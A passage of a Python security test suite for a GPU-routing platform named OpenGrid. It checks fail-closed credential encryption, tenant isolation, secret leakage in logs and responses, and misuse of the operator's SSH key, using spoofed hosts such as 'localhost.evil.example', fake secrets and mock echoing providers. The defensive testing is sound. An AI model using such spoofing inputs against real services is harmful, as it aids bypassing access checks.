                credentials.check_config()
                raise AssertionError("check_config accepted it")
            except RuntimeError:
                pass
        # deployed by DATABASE_URL alone, with ENVIRONMENT=development forced: still refused
        settings.environment = "development"
        url = settings.database_url
        settings.database_url = "postgresql+psycopg://u@db.prod.internal:5432/og"
        settings.credentials_encryption_key = None
        try:
            credentials.encrypt("x")
            raise AssertionError("dev forced on a remote database")
        except HTTPException as e:
            assert e.status_code == 503
        finally:
            settings.database_url = url
        # rotation with the admin CLI; the old key still decrypts until rotated
        settings.credentials_encryption_key, settings.credentials_encryption_keys_old = k1, None
        a = accounts.create_account("enc")
        secret = "rpa_TENANTSECRET0123456789abcdef"
        c = credentials.add(a["id"], "runpod", secret)
        settings.credentials_encryption_key, settings.credentials_encryption_keys_old = k2, k1
        import admin
        assert admin.main(["rotate-credentials"]) == 0
        settings.credentials_encryption_keys_old = None
        assert credentials.resolve(a["id"], "runpod") == ("byo", secret)
        # corrupted ciphertext fails closed (no managed fallback), at launch and for a pinned deployment
        settings.runpod_api_key = "MANAGED-RUNPOD-KEY-0000"
        with S.begin() as s:
            s.execute(text("UPDATE provider_credentials SET secret_encrypted = :b WHERE id = :i"),
                      {"b": b"gAAAAA" + b"x" * 80, "i": c["id"]})
        try:
            credentials.resolve(a["id"], "runpod")
            raise AssertionError("fell back")
        except credentials.CredentialUnavailable:
            pass
        from routing import credentials as rc
        for fn in (lambda: rc.resolve_for_launch(a["id"], "runpod"), lambda: rc.for_ref(f"byo:{c['id']}", "runpod")):
            try:
                fn()
                raise AssertionError("routing fell back")
            except rc.CredentialsUnavailable:
                pass
        # rotate reports, never drops, the undecryptable row
        out = credentials.rotate()
        assert f"provider_credentials:{c['id']}" in out["undecryptable"]
        with S() as s:
            assert s.execute(text("SELECT count(*) FROM provider_credentials WHERE id = :i"), {"i": c["id"]}).scalar() == 1
    finally:
        settings.credentials_encryption_key, settings.credentials_encryption_keys_old, settings.runpod_api_key = saved
        settings.environment = "development"


# ---------------------------------------------------------------- deployment detection

def test_deployment_detection_paths():
    setup()
    url = settings.database_url
    try:
        cases = [({"environment": "production"}, True), ({"environment": "PRODUCTION "}, True),
                 ({"environment": "staging"}, True), ({"environment": ""}, True), ({"environment": "dev"}, True),
                 ({"environment": "development"}, False),
                 ({"database_url": "postgresql+psycopg://u:p@postgres.railway.internal:5432/x"}, True),
                 ({"database_url": "postgresql+psycopg://u@localhost.evil.example/x"}, True),
                 ({"database_url": "postgresql+psycopg://u@127.0.0.2/x"}, True),
                 ({"database_url": "postgresql+psycopg://u@localhost,db.remote/x"}, True),
                 ({"database_url": "postgresql+psycopg://u@[::1]:5432/x"}, False),
                 ({"database_url": "postgresql+psycopg://u@127.0.0.1:5432/x"}, False)]
        for change, want in cases:
            settings.environment, settings.database_url = "development", url
            for k, v in change.items():
                setattr(settings, k, v)
            assert security.deployed() is want, (change, security.deployment_signals())
        settings.environment, settings.database_url = "development", url
        os.environ["RAILWAY_ENVIRONMENT"] = "staging"
        assert security.deployed()
    finally:
        os.environ.pop("RAILWAY_ENVIRONMENT", None)
        settings.environment, settings.database_url = "development", url
    # deployed + no password: every surface is closed (no open operator, no admin, no fetch)
    settings.app_password = None
    settings.environment = "production"
    try:
        for m, p in [("GET", "/"), ("GET", "/v1/admin/accounts"), ("POST", "/fetch"), ("GET", "/raw"),
                     ("POST", "/v1/keys"), ("GET", "/v1/me")]:
            r = client.request(m, p, headers=HDR)
            assert r.status_code in (401, 503), (p, r.status_code)
        # and the API key pepper is required (no derived pepper)
        settings.api_key_pepper = None
        try:
            keys.hash_key("opg_x")
            raise AssertionError("derived pepper used when deployed")
        except HTTPException as e:
            assert e.status_code == 503
    finally:
        settings.environment = "development"
        settings.app_password = "pw"
        settings.api_key_pepper = "test-pepper"


# ---------------------------------------------------------------- secret leakage

class _Capture(logging.Handler):
    def __init__(self):
        super().__init__(logging.DEBUG)
        self.lines = []

    def emit(self, record):
        try:
            self.lines.append(self.format(record))
        except Exception:  # noqa: BLE001
            self.lines.append(str(record.msg))
        for v in (record.args or ()) if isinstance(record.args, tuple) else ():
            self.lines.append(str(v))
        if record.exc_info:
            self.lines.append(logging.Formatter().formatException(record.exc_info))


def test_no_secrets_in_logs_responses_or_audit():
    S = setup()
    cap = _Capture()
    root = logging.getLogger()
    root.addHandler(cap)
    old_level = root.level
    root.setLevel(logging.DEBUG)
    saved = settings.credentials_encryption_key
    fkey = Fernet.generate_key().decode()
    settings.credentials_encryption_key = fkey
    try:
        a, k = _mgr("leak")
        H = bearer(k["secret"])
        r = client.post("/v1/keys", headers=H, json={"name": "child", "scopes": ["data:read"]})
        child = r.json()["data"]["secret"]
        byo = "rpa_BYOSECRETVALUE0123456789XYZ"
        r = client.post("/v1/credentials", headers=H, json={"provider": "runpod", "secret": byo})
        assert r.status_code == 201 and byo not in r.text
        listing = client.get("/v1/credentials", headers=H).text + client.get("/v1/keys", headers=H).text + \
            client.get("/v1/me", headers=H).text
        # failing paths too: bad key, wrong password, malformed credential, CSRF refusal
        client.get("/v1/me", headers=bearer(child + "x"))
        client.get("/v1/me", headers=basic(password="pw-wrong-but-close"))
        client.post("/v1/credentials", headers=H, json={"provider": "runpod", "secret": ""})
        client.post("/normalize", headers=basic())
        ssh_priv = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END OPENSSH PRIVATE KEY-----"
        client.post("/v1/route/preview", headers={**bearer(k["secret"])},
                    json={"gpu": "H100", "launch": {"ssh_public_key": ssh_priv}})
        with S() as s:
            dump = json.dumps([list(map(str, r)) for r in s.execute(text(
                "SELECT * FROM security_events")).all()]) + json.dumps([str(r) for r in s.execute(text(
                    "SELECT secret_encrypted, hint, label FROM provider_credentials")).all()]) + \
                json.dumps([list(map(str, r)) for r in s.execute(text("SELECT * FROM api_keys")).all()])
        logs = "\n".join(cap.lines)
        for secret in (k["secret"], child, byo, fkey, "test-pepper", ssh_priv.split("\n")[1]):
            assert secret not in logs, f"secret in logs: {secret[:10]}"
            assert secret not in listing, f"secret in API listing: {secret[:10]}"
            assert secret not in dump, f"secret in DB rows: {secret[:10]}"
        assert "pw-wrong-but-close" not in logs and base64.b64encode(b"opengrid:pw").decode() not in logs
    finally:
        root.removeHandler(cap)
        root.setLevel(old_level)
        settings.credentials_encryption_key = saved


def test_adapter_errors_do_not_echo_credentials():
    """Every adapter, against a provider that echoes the request's credentials back in error bodies
    (JSON and plain text, 4xx/5xx, and a 2xx non-JSON body where the key straddles the truncation point)."""
    from routing import adapters

    cap = _Capture()
    root = logging.getLogger()
    root.addHandler(cap)
    root.setLevel(logging.DEBUG)
    secret = "LEAKME0123456789abcdefSECRET"
    problems = []
    try:
        for provider, cls in sorted(adapters.ADAPTERS.items()):
            creds = {"client_id": "cid-LEAKME-0123", "client_secret": secret} if provider == "verda" else {"api_key": secret}

            def echo(request, mode):
                auth = " ".join(f"{k}={v}" for k, v in request.headers.items()
                                if k.lower() in ("authorization", "api_key", "x-api-key"))
                body = request.content.decode("utf-8", "replace")
                blob = f"{auth} {request.url} {body}"
                if request.url.path.endswith(("/token", "/oauth2/token")):
                    return httpx.Response(200, json={"access_token": "tok_LEAKME_ACCESS_0123456789", "expires_in": 3600})
                if mode == "json":
                    return httpx.Response(401, json={"error": "bad credentials", "echo": blob})
                if mode == "text":
                    return httpx.Response(500, text="upstream failed: " + blob)
                if mode == "straddle":  # the key crosses the 500-char truncation of kept bodies
                    return httpx.Response(200, text="z" * 488 + secret)
                return httpx.Response(403, text=blob)

            for mode in ("json", "text", "straddle", "plain"):
                a = cls(creds, transport=httpx.MockTransport(lambda r, m=mode: echo(r, m)), provider=provider)
                outs = []
                for op in (lambda: a.status("i-1"), lambda: a.terminate("i-1"), lambda: a.list_instances()):
                    try:
                        res = op()
                        outs.append(repr(res))
                        outs.append(json.dumps(getattr(res, "as_dict", lambda: {})(), default=str))
                    except Exception as e:  # noqa: BLE001
                        outs.append(repr(e) + str(e) + json.dumps(getattr(e, "as_dict", lambda: {})(), default=str))
                text_out = "\n".join(outs)
                for needle in (secret, secret[:12], secret[-12:], "tok_LEAKME_ACCESS"):
                    if needle in text_out:
                        problems.append((provider, mode, "result", needle[:8]))
        logs = "\n".join(cap.lines)
        for needle in (secret, secret[:12], "tok_LEAKME_ACCESS"):
            if needle in logs:
                problems.append(("logs", needle[:8]))
    finally:
        root.removeHandler(cap)
    assert not problems, sorted(set(problems))


# ---------------------------------------------------------------- tenant isolation of credentials

def test_byo_credentials_are_tenant_isolated():
    setup()
    from routing import credentials as rc

    saved = (settings.credentials_encryption_key, settings.runpod_api_key)
    settings.credentials_encryption_key = Fernet.generate_key().decode()
    settings.runpod_api_key = "PLATFORM-RUNPOD-KEY-9999"
    try:
        a, ka = _mgr("tenant-A")
        b, kb = _mgr("tenant-B")
        ca = client.post("/v1/credentials", headers=bearer(ka["secret"]),
                         json={"provider": "runpod", "secret": "rpa_AAAAAAAAAAAAAAAAAAAAAAAA"}).json()["data"]
        op = accounts.operator_account_id()
        credentials.add(op, "lambda", "secret_OPERATORLAMBDAKEY000000")
        # B cannot see, revoke or use A's credential, nor the operator's
        lb = client.get("/v1/credentials", headers=bearer(kb["secret"])).json()["data"]
        assert lb["byo"] == [] and "PLATFORM-RUNPOD" not in json.dumps(lb)
        assert client.delete(f"/v1/credentials/{ca['id']}", headers=bearer(kb["secret"])).status_code == 404
        assert rc.resolve_for_launch(b["id"], "runpod").ref == "platform:runpod"
        assert rc.resolve_for_launch(b["id"], "lambda") is None or \
            rc.resolve_for_launch(b["id"], "lambda").source == "opengrid"
        assert rc.resolve_for_launch(a["id"], "runpod").ref == f"byo:{ca['id']}"
        # A's credential still works for A after B's attempts
        assert credentials.list_for(a["id"])[0]["state"] == "active"
        # platform credentials are never returned by any API
        for path in ("/v1/credentials", "/v1/me", "/v1/keys"):
            assert "PLATFORM-RUNPOD-KEY" not in client.get(path, headers={**basic()}).text
    finally:
        settings.credentials_encryption_key, settings.runpod_api_key = saved


def test_deployments_are_tenant_isolated():
    """B can never read, stop, terminate, report on, or cause a provider call for A's deployment, and the
    pinned credential (A's BYO key) is used for A's deployment only."""
    S = setup()
    import secrets as _s

    from routing import adapters
    from store.routing import Deployment

    calls = []
    saved = dict(adapters.TRANSPORTS)
    for p in adapters.ADAPTERS:
        adapters.TRANSPORTS[p] = httpx.MockTransport(lambda r: calls.append((str(r.url), r.headers.get("authorization")))
                                                     or httpx.Response(500, json={}))
    try:
        a = accounts.create_account("dep-A")
        b = accounts.create_account("dep-B")
        sc = ["deployments:read", "deployments:write", "data:read", "route:preview"]
        kb = keys.create_key(b["id"], "b", sc)
        ka = keys.create_key(a["id"], "a", sc)
        dep_id = "dep-" + _s.token_hex(6)
        now = datetime.now(timezone.utc)
        with S.begin() as s:
            s.add(Deployment(deployment_id=dep_id, account_id=a["id"], route_request_id="rr_isol", provider="runpod",
                             listing_id="L", provider_instance_id="pod-A", gpu="NVIDIA H100", gpu_count=1,
                             status="running", created_at=now, uptime_seconds=0, interruptions=0, purpose="customer",
                             client_name=f"og-{dep_id}", credential_source="byo", credential_ref="byo:999999",
                             launch_token=_s.token_hex(8), state_changed_at=now, provider_metadata={},
                             override_limits=False, provisioned_at=now, effective_max_runtime_minutes=60))
        H = {**bearer(kb["secret"]), **HDR, "Idempotency-Key": "k-" + _s.token_hex(4)}
        for m, p, body in [("GET", f"/v1/deployments/{dep_id}", None), ("GET", f"/v1/deployments/{dep_id}?refresh=true", None),
                           ("POST", f"/v1/deployments/{dep_id}/terminate", None),
                           ("POST", f"/v1/deployments/{dep_id}/stop", None),
                           ("POST", f"/v1/deployments/{dep_id}/outcome", {"workload_completed": True}),
                           ("POST", f"/v1/deployments/{dep_id}/feedback", {"rating": 1}),
                           ("GET", "/v1/route/rr_isol", None)]:
            r = client.request(m, p, headers=H, json=body)
            assert r.status_code in (404, 422), (m, p, r.status_code, r.text[:200])
            assert dep_id not in r.text or r.status_code == 422
        lst = client.get("/v1/deployments", headers=bearer(kb["secret"])).json()
        assert dep_id not in json.dumps(lst)
        assert not calls, f"B's requests reached a provider: {calls}"
        # A's own refresh uses ONLY the pinned credential; it is missing here, so: no provider call, no fallback
        settings.runpod_api_key = "PLATFORM-KEY-SHOULD-NOT-BE-USED"
        r = client.get(f"/v1/deployments/{dep_id}?refresh=true", headers=bearer(ka["secret"]))
        assert r.status_code == 200, r.text[:300]
        assert not any("PLATFORM-KEY" in (h or "") for _, h in calls), calls
        with S() as s:
            assert s.get(Deployment, dep_id).status != "terminated"
    finally:
        adapters.TRANSPORTS.clear()
        adapters.TRANSPORTS.update(saved)
        settings.runpod_api_key = None


# ---------------------------------------------------------------- operator SSH key never on customer launches

def _ed25519_pub(comment):
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

    pub = Ed25519PrivateKey.generate().public_key().public_bytes(serialization.Encoding.OpenSSH,
                                                                 serialization.PublicFormat.OpenSSH).decode()
    return f"{pub} {comment}"


class LaunchSpecForTest:
    def __init__(self, pub):
        self.ssh_public_key, self.ssh_key = pub, None


def test_operator_ssh_key_never_reaches_customer_launch():
    """routing_launch_defaults carries the operator's key (by name and as key material). No customer launch
    spec, on any adapter, with any credential source, may carry it; the deployment-level last check refuses
    the operator's key material even when a customer submits it as their own on OpenGrid's account."""
    from types import SimpleNamespace

    from routing import adapters, deployments, engine

    op_pub, cust_pub = _ed25519_pub("ops@og"), _ed25519_pub("c@x")
    op_blob = op_pub.split()[1]
    saved = settings.routing_launch_defaults
    settings.routing_launch_defaults = {p: {"ssh_key": "opengrid-ops", "ssh_public_key": op_pub, "image": "img"}
                                        for p in adapters.ADAPTERS}
    try:
        produced = 0
        for provider, cls in adapters.ADAPTERS.items():
            for source in ("opengrid", "byo", None):
                for req in ({}, {"ssh_public_key": cust_pub}, {"image": "x"}, {"ssh_key": "", "ssh_public_key": ""}):
                    spec, problem = engine.launch_spec_for(provider, req, purpose="customer", credential_source=source,
                                                           adapter_cls=cls)
                    if spec is None:
                        continue
                    produced += 1
                    blob = json.dumps(spec.as_dict() if hasattr(spec, "as_dict") else vars(spec), default=str)
                    assert "opengrid-ops" not in blob and op_blob not in blob, (provider, source, req)
                # a customer on OpenGrid's provider account cannot reference an account key by NAME
                spec, problem = engine.launch_spec_for(provider, {"ssh_key": "opengrid-ops"}, purpose="customer",
                                                       credential_source="opengrid", adapter_cls=cls)
                assert spec is None and problem, (provider, "key name reference accepted on the managed account")
                # a private key is refused without echoing it
                priv = "-----BEGIN OPENSSH PRIVATE KEY-----\nAAAAsecretmaterial\n-----END OPENSSH PRIVATE KEY-----"
                spec, problem = engine.launch_spec_for(provider, {"ssh_public_key": priv}, purpose="customer",
                                                       credential_source="byo", adapter_cls=cls)
                assert spec is None and "AAAAsecretmaterial" not in (problem or "")
        assert produced, "no launch spec was produced at all: the test exercised nothing"
        # a provider that may install the account's own keys holds a managed-account customer launch
        for provider, cls in adapters.ADAPTERS.items():
            forced, _ = engine.forces_account_ssh_key(cls)
            spec = LaunchSpecForTest(cust_pub)
            for source in ("opengrid", None):
                acc = engine.ssh_access_for(provider, spec, purpose="customer", credential_source=source, adapter_cls=cls)
                assert acc["blocked"] is (forced != "NO"), (provider, source, forced, acc)
                assert acc["operator_access"] != "validation_operator_key"
        # the validation launch (operator) is the one place the operator key is used
        spec, _ = engine.launch_spec_for("lambda", {}, purpose="validation", credential_source="opengrid",
                                         adapter_cls=adapters.get("lambda"))
        assert spec is not None and spec.ssh_key == "opengrid-ops"
        # last-moment guard: the operator's key material submitted as the customer's own key
        from routing.adapters.base import LaunchSpec
        d = SimpleNamespace(purpose="customer", provider="lambda")
        for ls in (LaunchSpec.merged({"ssh_public_key": op_pub}, {}), LaunchSpec.merged({"ssh_key": "opengrid-ops"}, {})):
            assert deployments._operator_key_problem(d, ls, SimpleNamespace(source="opengrid")), ls
        assert deployments._operator_key_problem(d, LaunchSpec.merged({"ssh_public_key": cust_pub}, {}),
                                                 SimpleNamespace(source="opengrid")) is None
    finally:
        settings.routing_launch_defaults = saved


TESTS = [test_csrf_every_route, test_open_dev_refuses_dns_rebinding, test_bearer_exemption_not_abusable, test_safe_url_server, test_safe_url_web_client,
         test_csp_does_not_allow_injected_inline_script, test_security_headers_everywhere,
         test_key_inheritance_and_escalation, test_revoked_parent_cannot_have_live_children, test_revoke_create_race,
         test_key_cap_under_concurrency, test_account_rate_limit_concurrency_and_churn,
         test_public_limit_not_bypassed_by_xff, test_login_throttle_attacks, test_admin_routes_require_platform_admin,
         test_webhook_ssrf_matrix, test_webhook_delivery_attacks, test_ops_alert_webhook_uses_the_same_guard,
         test_credential_encryption_fail_closed, test_deployment_detection_paths,
         test_no_secrets_in_logs_responses_or_audit, test_adapter_errors_do_not_echo_credentials,
         test_byo_credentials_are_tenant_isolated, test_deployments_are_tenant_isolated,
         test_operator_ssh_key_never_reaches_customer_launch]

if __name__ == "__main__":
    only = sys.argv[1:]
    failed = []
    try:
        for t in TESTS:
            if only and t.__name__ not in only:
                continue
            try:
                t()
                print(t.__name__, "ok")
            except Exception as e:  # noqa: BLE001
                import traceback
                traceback.print_exc()
                failed.append(t.__name__)
                print(t.__name__, "FAILED")
    finally:
        settings.app_password = None
        scratchdb.drop(DB)
    if failed:
        print("FAILED:", failed)
        sys.exit(1)
